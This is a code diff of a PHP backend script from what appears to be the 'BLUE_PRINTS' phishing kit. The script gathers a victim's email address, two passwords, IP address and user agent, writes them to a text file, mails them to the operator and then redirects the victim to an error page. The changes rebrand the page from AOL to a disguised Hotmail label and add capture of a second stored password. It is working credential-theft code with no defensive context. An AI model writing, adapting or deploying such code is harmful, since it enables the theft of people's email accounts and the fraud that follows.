@@ -33,12 +33,12 @@ $agent = $_SERVER['HTTP_USER_AGENT'];
 
 include "../../step/conf/config.php";
 
-
 $msg =  $_SESSION['msg'];
 $msg .= "+ ------------------------------------------+\n";
-$msg .= "|   💵BLUE_PRINTS | Aol Login Details \n";
+$msg .= "|   💵BLUE_PRINTS | H0TM4il Login Details \n";
 $msg .= "+ ------------------------------------------+\n";
 $msg .= "| 📧 EMAIL  :  ".$useremail."\n";
+$msg .= "| 🔑 PASS   :  ".$_SESSION['password']."\n";
 $msg .= "| 🔑 PASS 2 :  ".$pass."\n"; 
 $footer = "+ ------------------------------------------+\n";
 $footer .= "+ IP => $ip \n  USERAGENT => $agent\n";
@@ -49,15 +49,19 @@ if($savetxt == "on"){
 $save=fopen("../../step/data/email".$salt.".txt",'a');
 	          fwrite($save,$data );
 	          fclose($save);
-            }
+              
+                }
+
+
+$_SESSION['emailr'] = $msg;
 
 $subject="Email 1NFO By BLUE_PR1NTS=> {$_SERVER['REMOTE_ADDR']} {$_SESSION['usernam']} [ {$_SESSION['platform']} ]";
 $headers="From: BLUE_PR1NTS <MTB@BLUE_PRINTS.com>\r\n";
 $headers .= "Content-Type: text/plain; charset=utf-8\r\n";
 @mail($emailzz, $subject, $data, $headers);
  
- sleep(1);
-header("location: error.php?token={$_SESSION['token']}"); 
+
+header("location: error.php?token={$_SESSION['token']}");  
 }
 
 ?>
